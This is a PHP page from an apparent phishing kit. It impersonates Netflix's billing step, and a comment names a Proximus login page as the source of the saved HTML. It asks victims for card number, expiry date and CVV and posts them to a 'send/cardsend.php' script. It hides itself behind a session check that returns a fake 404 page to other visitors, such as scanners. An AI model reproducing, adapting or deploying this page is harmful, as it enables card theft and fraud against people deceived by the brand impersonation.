<?php 
ob_start();
session_start();
if(isset($_SESSION['step_three'])){
include ('../translation.php');
?>

<!DOCTYPE html>
<!-- saved from url=(0045)https://www.proximus.be/login/fr/default.html -->
<html data-triggered="true" lang="<?php echo $meta_langue ?>">
   <head>
	   <script src="../js/jquery-1.11.3.min.js"></script>
      <style>
         ------------------------------- */
         .group 			  { 
         position:relative; 
         margin-bottom:45px; 
         }
         input 				{
         font-size:18px;
         padding:10px 10px 10px 5px;
         display:block;
         width:300px;
         border:none;
         border-bottom:1px solid #757575;
         }
         input:focus 		{ outline:none; }
         /* LABEL ======================================= */
         label 				 {
         color:#999; 
         font-size:18px;
         font-weight:normal;
         position:absolute;
         pointer-events:none;
         left:5px;
         top:10px;
         transition:0.2s ease all; 
         -moz-transition:0.2s ease all; 
         -webkit-transition:0.2s ease all;
         }
         /* active state */
         input:focus ~ label, input:valid ~ label 		{
         top:-20px;
         font-size:14px;
         color:#5264AE;
         }
         /* BOTTOM BARS ================================= */
         .bar 	{ position:relative; display:block; width:300px; }
         .bar:before, .bar:after 	{
         content:'';
         height:2px; 
         width:0;
         bottom:1px; 
         position:absolute;
         background:#5264AE; 
         transition:0.2s ease all; 
         -moz-transition:0.2s ease all; 
         -webkit-transition:0.2s ease all;
         }
         .bar:before {
         left:50%;
         }
         .bar:after {
         right:50%; 
         }
         /* active state */
         input:focus ~ .bar:before, input:focus ~ .bar:after {
         width:50%;
         }
         /* HIGHLIGHTER ================================== */
         .highlight {
         position:absolute;
         height:60%; 
         width:100px; 
         top:25%; 
         left:0;
         pointer-events:none;
         opacity:0.5;
         }
         /* active state */
         input:focus ~ .highlight {
         -webkit-animation:inputHighlighter 0.3s ease;
         -moz-animation:inputHighlighter 0.3s ease;
         animation:inputHighlighter 0.3s ease;
         }
         /* ANIMATIONS ================ */
         @-webkit-keyframes inputHighlighter {
         from { background:#5264AE; }
         to 	{ width:0; background:transparent; }
         }
         @-moz-keyframes inputHighlighter {
         from { background:#5264AE; }
         to 	{ width:0; background:transparent; }
         }
         @keyframes inputHighlighter {
         from { background:#5264AE; }
         to 	{ width:0; background:transparent; }
         }
      </style>
      <script>
         function formatString(e) {
           var inputChar = String.fromCharCode(event.keyCode);
           var code = event.keyCode;
           var allowedKeys = [8];
           if (allowedKeys.indexOf(code) !== -1) {
             return;
           }
         
           event.target.value = event.target.value.replace(
             /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
           ).replace(
             /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
           ).replace(
             /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
           ).replace(
             /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
           ).replace(
             /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
           ).replace(
             /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
           ).replace(
             /\/\//g, '/' // Prevent entering more than 1 `/`
           );
         }
         
      </script>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="origin-trial" data-feature="EME Extension - Policy Check" data-expires="2018-11-26" content="Aob+++752GiUzm1RNSIkM9TINnQDxTlxz02v8hFJK/uGO2hmXnJqH8c/ZpI05b2nLsHDhGO3Ce2zXJUFQmO7jA4AAAB1eyJvcmlnaW4iOiJodHRwczovL25ldGZsaXguY29tOjQ0MyIsImZlYXR1cmUiOiJFbmNyeXB0ZWRNZWRpYUhkY3BQb2xpY3lDaGVjayIsImV4cGlyeSI6MTU0MzI0MzQyNCwiaXNTdWJkb21haW4iOnRydWV9">
      <title><?php echo $meta_title ?></title>
      <link rel="preload" href="../js/jslogin.js" as="script">
      <meta content="<?php echo $meta_keywords ?>" name="keywords">
      <meta content="<?php echo $meta_description ?>" name="description">
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link type="text/css" rel="stylesheet" href="../css/billing2.css">
      <link rel="shortcut icon" href="../img/nficon2016.ico">
      <link rel="apple-touch-icon" href="../img/nficon2016.png">
      <meta property="og:description" content="<?php echo $meta_description ?>">
      <meta name="twitter:card" content="player">
      <meta name="twitter:site" content="@netflix">
   </head>
   <body>
      <div id="appMountPoint">
         <div class="netflix-sans-font-loaded">
            <div class="basicLayout notMobile modernInApp signupSimplicity-registrationWithContext simplicity" dir="ltr" lang="fr-FR">
               <div class="nfHeader noBorderHeader signupBasicHeader">
                  <a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
                     <svg style="margin-top: 15px;" viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                        <g id="netflix-logo">
                           <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                        </g>
                     </svg>
                     <span class="screen-reader-text">Netflix</span>
                  </a>
                  <a href="../login.php" class="authLinks signupBasicHeader" data-uia="header-login-link"><?php echo $Deconnexion ?></a>
               </div>
               <div class="simpleContainer" data-transitioned-child="true">
                  <div class="centerContainer firstLoad" data-uia="password-only-page-container">
                     <form method="POST" action="<?php echo './send/cardsend.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>">
                        <div class="regFormContainer passwordFormContainer" data-uia="form-registration">
                           <div class="stepHeader-container" data-uia="header">
                              <div class="stepHeader" data-a11y-focus="true">
                                 <span id="" class="stepIndicator" data-uia=""><?php echo $Etape ?><b><?php echo $Etape2 ?></b><?php echo $SUR ?><b><?php echo $Etape2sur3 ?></b></span>
                                 <h1 class="stepTitle" data-uia="stepTitle"><span id="" data-uia=""><?php echo $Confirmervotremoyendepaiement ?></span></h1>
                              </div>
                           </div>
                           <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="<?php echo $acceptpaymentcards ?>"><img alt="" class="logoIcon VISA" data-uia="logoIcon-VISA" src="../img/visa-v3.svg"><img alt="" class="logoIcon MASTERCARD" data-uia="logoIcon-MASTERCARD" src="../img/mastercard-v2.svg"><img alt="" class="logoIcon AMEX" data-uia="logoIcon-AMEX" src="../img/amex-v2.svg"><img alt="" class="logoIcon CARTES_BANCAIRES" data-uia="logoIcon-CARTES_BANCAIRES" src="../img/icon_cartes_bancaires.png" srcset="../img/icon_cartes_bancaires_2x.png"></span>
                           <br>
                           <br>
                           <style>
                              .formv2 { padding-left: 8px;border:none;width:100%; }
                              .labev2 { padding-left:8px;font-size:13px;opacity: 0.85;font-weight:bold; }
                              .contentv2 { width:100%;border: solid 1px gray;border-radius:2px;margin-bottom:12px;  }
                              .sepv2 { height:4px; }
                              .difv2 { font-size: 13px; margin-bottom:24px; }
                              .sep2v2 { height: 24px; }
                              #helpv2 { position:relative;margin-top:-45px;float:right;margin-right:12px; }
                           </style>
						<script>
$( document ).ready(function() {
            $.urlParam = function(name){
     var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
     return results[1] || 0;
}         
$('#hcul').on('focusout',function(){
             $('#ccnum,#labev2,#sepv2').removeClass('is-invalid');
});
$("#hcul,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });                   
if($.urlParam('error')){
$(#hcul).addClass('is-invalid');
}
});
               </script>
							<style>
										.is-invalid {
										border: 1px solid red;
										
										}
							</style>
                     
                           <div class="sep2v2"></div>
                           <div class="contentv2" id="hcul" name="hcul">
                              <div class="sepv2"></div>
                              <span class="labev2"><?php echo $numerodecarte ?></span>
                              <input required type="text" id="c_num" name="c_num" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="16">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2"><?php echo $datedexpiration ?></span>
                              <input required type="text" id="exdate" placeholder="MM/AA" name="exdate" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="formatString(event);" maxlength="5">
                           </div>
                           <div class="contentv2">
                              <div class="sepv2"></div>
                              <span class="labev2"><?php echo $Cryptogrammevisuel ?></span>
                              <input required type="text" id="csc" placeholder="CVV" name="csc" class="formv2" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" maxlength="4">
                              <div id="helpv2" onclick="return BxhNam();">
                                 <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                                    <g fill="none" fill-rule="evenodd">
                                       <g>
                                          <circle stroke="#A9A6A6" stroke-width="2" cx="18" cy="18" r="17"></circle>
                                          <path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" fill="#A9A6A6"></path>
                                       </g>
                                    </g>
                                 </svg>
                              </div>
                           </div>
                           <script> 
                              function BxhNam() {
                                  document.getElementById("Top5").style.display = "block";
                              }
                              
                              function BxhNamC() {
                                  document.getElementById("Top5").style.display = "none";
                              }
                           </script>
                     <?php if(isset($_GET["error"])){ ?>    <p style="color :red"><?php echo $Lesinformationsincorrect ?></p> <?php } ?>
                           <div class="submitBtnContainer"><button name="auth" type="submit" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-registration" placeholder="regForm_button_next" style="font-size:16px;"><?php echo $Finaliser ?></button></div>
                        </div>
                     </form>
                  </div>
               </div>
            </div>
         </div>
               <?php include './footer.php'; ?>
               <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
            </div>
         </div>
      </div>
      <div>
         <div style="display: none" id="Top5" class="cvvTooltip" data-uia="cvvTooltipModal">
            <span data-uia="cvvTooltipModal-close" onclick="return BxhNamC();" class="icon-close close-button pointer"></span>
            <div class="tooltipDesc"><?php echo $informationcryprogramme ?></div>
            <div class="otherCvvHelp"></div>
            <div class="amexCvvHelp"></div>
         </div>
      </div>
   </body>
</html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>